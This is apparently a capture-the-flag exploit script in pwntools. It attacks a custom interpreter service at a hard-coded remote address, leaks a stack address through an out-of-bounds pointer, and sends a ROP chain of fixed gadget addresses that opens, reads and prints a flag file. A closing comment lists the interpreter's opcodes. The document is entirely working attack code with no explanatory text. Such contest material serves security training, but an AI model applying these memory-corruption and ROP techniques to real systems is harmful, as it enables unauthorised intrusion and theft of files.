from pwn import*
p = process('./main')
#context.log_level ='DEBUG'
payload = '${@$}@$'
payload = payload.replace('\n','')
p = remote('101.200.53.148',15324)
p.sendlineafter('enter your code:',payload)
for i in range(0x400):
	p.send('\xFF')
p.send('\x10')
stack = u64(p.recvuntil('\x7F',timeout=0.2)[-6:].ljust(8,'\x00'))
log.info('Stack:\t' + hex(stack))
p.send('Y')
p.sendlineafter('enter your code:','F'*0x10 + '\x08' + '\x01'*0x10)
p.send('Y')

p.sendlineafter('enter your code:','F'*0x8 + '\x78')
p.send('Y')
p.sendlineafter('enter your code:','F'*0x10 + '\x48')
p.send('Y')

target_FLAG = stack + 0x138
mov_rax_1 = 0x524300
mov_rax_2 = 0x524310
mov_rax_rsi = 0x417427
pop_rdi_ret = 0x4047BA
pop_rsi_ret = 0x407578
pop_rdx_ret = 0x40437F
pop_rsp_ret = 0x405831
syscall = 0x52A725
rop  = '\x00'*0x30
rop += p64(pop_rdi_ret) + p64(target_FLAG)
rop += p64(pop_rsi_ret) + p64(0)
rop += p64(pop_rdx_ret) + p64(0)
rop += p64(mov_rax_2)
rop += p64(syscall)
rop += p64(pop_rdi_ret) + p64(3)
rop += p64(pop_rsi_ret) + p64(0)
rop += p64(mov_rax_rsi)
rop += p64(pop_rsi_ret) + p64(0x5D9B00)
rop += p64(pop_rdx_ret) + p64(0x30)
rop += p64(syscall)
rop += p64(pop_rdi_ret) + p64(1)
rop += p64(pop_rsi_ret) + p64(0x5D9B00)
rop += p64(pop_rdx_ret) + p64(0x30)
rop += p64(mov_rax_1)
rop += p64(syscall)
rop += './flag\x00'

p.sendlineafter('enter your code:',rop)
p.send('Y')
p.sendlineafter('enter your code:',payload)
for i in range(0x400):
	p.send('\x20')
p.send('\x20')
p.send('N')
p.interactive()


'''
@ ptr += 1
# ptr -= 1
^ *ptr += 1
| *ptr -= 1
& write(1,ptr,1)
$ read(0,ptr,1)
* (*ptr)<<2
~ ~(*ptr)
{ be similar to while 
}
'''
